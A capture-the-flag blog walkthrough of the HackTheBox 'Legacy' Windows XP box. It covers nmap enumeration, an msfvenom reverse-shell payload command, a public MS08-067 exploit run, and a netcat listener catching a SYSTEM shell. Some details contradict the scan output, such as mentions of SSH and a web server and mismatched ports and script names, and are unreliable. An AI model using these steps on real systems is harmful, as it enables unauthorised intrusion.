---
layout: post
title: "HackTheBox - Legacy"
description: "Walkthrough of Legacy box on Hackthebox."
thumb_image: "documentation/legacythumb.png"
tags: [ hackthebox ]
---

{% include image.html path="documentation/legacy.webp"
path-detail="documentation/legacy.webp"
alt="HTB Legacy" %}

## HTB - Legacy

IP - 10.10.10.4

### Overview

This box was an easy level windows box on HTB created by [ch4p](https://www.hackthebox.eu/home/users/profile/1), it started with finding that the box is running a vulnerable `samba server` and the OS version of the box, then we use `ms08-067 exploit` to get a shell on the box.

### Enumeration

As always let’s start off with nmap script nmap -sC for default scripts ~~Alright, if it isn’t obvious yet I am a IPPSEC fanboi.~~ Aight, firing up nmap to scan all open ports on the box.

{% highlight bash %}
┌─[fumenoid@parrot]─[~/Desktop/Fumenoid/Pentest/HTB/Legacy]
└──╼ $sudo nmap -sC -sV -o nmap/initial 10.10.10.4
{% endhighlight %} 
And here is our nmap result
{% highlight bash %}
Nmap scan report for 10.10.10.4
Host is up (0.084s latency).
Not shown: 997 filtered ports
PORT     STATE  SERVICE       VERSION
139/tcp  open   netbios-ssn   Microsoft Windows netbios-ssn
445/tcp  open   microsoft-ds  Windows XP microsoft-ds
3389/tcp closed ms-wbt-server
Service Info: OSs: Windows, Windows XP; CPE: cpe:/o:microsoft:windows, cpe:/o:microsoft:windows_xp

Host script results:
|_clock-skew: mean: -3h58m16s, deviation: 1h24m50s, median: -4h58m16s
|_nbstat: NetBIOS name: LEGACY, NetBIOS user: <unknown>, NetBIOS MAC: 00:50:56:b9:cc:9c (VMware)
| smb-os-discovery: 
|   OS: Windows XP (Windows 2000 LAN Manager)
|   OS CPE: cpe:/o:microsoft:windows_xp::-
|   Computer name: legacy
|   NetBIOS computer name: LEGACY\x00
|   Workgroup: HTB\x00
|_  System time: 2020-11-02T08:38:51+02:00
| smb-security-mode: 
|   account_used: <blank>
|   authentication_level: user
|   challenge_response: supported
|_  message_signing: disabled (dangerous, but default)
|_smb2-time: Protocol negotiation failed (SMB2)

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 71.92 seconds
{% endhighlight %}

Open services SSH on port 22 and webserver on port 80. As there aren’t many attacks possible on ssh so I am gonna shift my focus on the web server.

#### Foothold

The nmap is detecting OS version, `Windows XP`. Windows XP is pretty old and so the services running probably have some vulnerability. Samba seems like our attack vector so let’s enumerate Samba.

{% highlight bash %}
┌─[fumenoid@parrot]─[~/Desktop/Fumenoid/Pentest/HTB/Legacy]
└──╼ $nmap -Pn --script smb-vuln* -p 445 -o nmap/smb_scan 10.10.10.4
Starting Nmap 7.80 ( https://nmap.org ) at 2020-11-02 15:24 IST
Nmap scan report for 10.10.10.4
Host is up (0.086s latency).

PORT    STATE SERVICE
445/tcp open  microsoft-ds

Host script results:
| smb-vuln-ms08-067: 
|   VULNERABLE:
|   Microsoft Windows system vulnerable to remote code execution (MS08-067)
|     State: LIKELY VULNERABLE
|     IDs:  CVE:CVE-2008-4250
|           The Server service in Microsoft Windows 2000 SP4, XP SP2 and SP3, Server 2003 SP1 and SP2,
|           Vista Gold and SP1, Server 2008, and 7 Pre-Beta allows remote attackers to execute arbitrary
|           code via a crafted RPC request that triggers the overflow during path canonicalization.
|           
|     Disclosure date: 2008-10-23
|     References:
|       https://technet.microsoft.com/en-us/library/security/ms08-067.aspx
|_      https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2008-4250
|_smb-vuln-ms10-054: false
|_smb-vuln-ms10-061: ERROR: Script execution failed (use -d to debug)
| smb-vuln-ms17-010: 
|   VULNERABLE:
|   Remote Code Execution vulnerability in Microsoft SMBv1 servers (ms17-010)
|     State: VULNERABLE
|     IDs:  CVE:CVE-2017-0143
|     Risk factor: HIGH
|       A critical remote code execution vulnerability exists in Microsoft SMBv1
|        servers (ms17-010).
|           
|     Disclosure date: 2017-03-14
|     References:
|       https://blogs.technet.microsoft.com/msrc/2017/05/12/customer-guidance-for-wannacrypt-attacks/
|       https://technet.microsoft.com/en-us/library/security/ms17-010.aspx
|_      https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2017-0143

Nmap done: 1 IP address (1 host up) scanned in 12.23 seconds
{% endhighlight %}

And seems like the smb server is vulnerable to `smb-vuln-ms08-067`.

### Exploitation

After Searching a bit, I reached this [ms08-067 python exploit](https://github.com/jivoi/pentest/blob/master/exploit_win/ms08-067.py).

The exploit script requires three arguments, target box IP, the port of vulnerable service and the OS info from a list of [1-8] menu it present to us. `6` option is for `Windows XP English` so I will be trying that first tho before that, we need to create a payload to get a reverse shell using `msfvenom` and replace it with the shellcode in the `exploit`.

{% highlight bash %}
┌─[fumenoid@parrot]─[~/Desktop/Fumenoid/Pentest/HTB/Legacy]
└──╼ $msfvenom -p windows/shell_reverse_tcp LHOST=10.10.14.33 LPORT=9889 EXITFUNC=thread -b "\x00\x0a\x0d\x5c\x5f\x2f\x2e\x40" -f c -a x86 --platform windows
{% endhighlight %} 

Replace the shell code in the script and start a netcat listner using `rlwrap nc -lvnp 9889`. Note : If this exploit fails better reset the box.

{% highlight bash %}
┌─[fumenoid@parrot]─[~/Desktop/Fumenoid/Pentest/HTB/Legacy]
└──╼ $python ms09-067.py 10.10.10.4 6 9889
#######################################################################
#   MS08-067 Exploit
#   This is a modified verion of Debasis Mohanty's code (https://www.exploit-db.com/exploits/7132/).
#   The return addresses and the ROP parts are ported from metasploit module exploit/windows/smb/ms08_067_netapi
[REDACTED]
Windows XP SP3 English (NX)

[-]Initiating connection
[-]connected to ncacn_np:10.10.10.4[\pipe\browser]
Exploit finish
{% endhighlight %} 

Checking our `netcat` listner.

{% highlight bash %}
┌─[fumenoid@parrot]─[~/Desktop/Fumenoid/Pentest/HTB/Legacy]
└──╼ $rlwrap nc -lvnp 9889
[sudo] password for fumenoid: 
listening on [any] 443 ...
connect to [10.10.14.33] from (UNKNOWN) [10.10.10.4] 1028
Microsoft Windows XP [Version 5.1.2600]
(C) Copyright 1985-2001 Microsoft Corp.

C:\WINDOWS\system32>whoami
NT Authority\System
{% endhighlight %} 

Now we can read both `user.txt` and `root.txt`.

###### Hope you learned something new, if you face any issues / have any query, feel free to contact me on social media.